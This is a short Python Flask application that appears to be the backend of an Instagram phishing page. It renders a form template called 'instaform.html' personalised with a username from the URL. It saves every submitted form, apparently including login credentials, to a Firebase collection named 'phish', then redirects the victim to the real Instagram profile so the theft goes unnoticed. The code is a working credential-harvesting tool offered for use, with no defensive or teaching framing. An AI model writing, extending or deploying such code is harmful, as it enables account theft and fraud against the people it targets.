from flask import Flask,render_template,request,redirect,url_for
import json
import smtplib
from firebase import firebase


firebase = firebase.FirebaseApplication('take firebase account to handle db')
app = Flask(__name__)

@app.route('/<user>')
@app.route('/index/<user>')
def index(user):
    name = user
    return render_template('instaform.html',user=name)
@app.route('/process',methods=['GET','POST'])
def process():
   
    if request.method == 'POST':
        data = request.form
        firebase.post("phish",data)
        
        return redirect(f"http://instagram.com/{data['name']}")




if __name__=="__main__":
    app.run(debug=True)
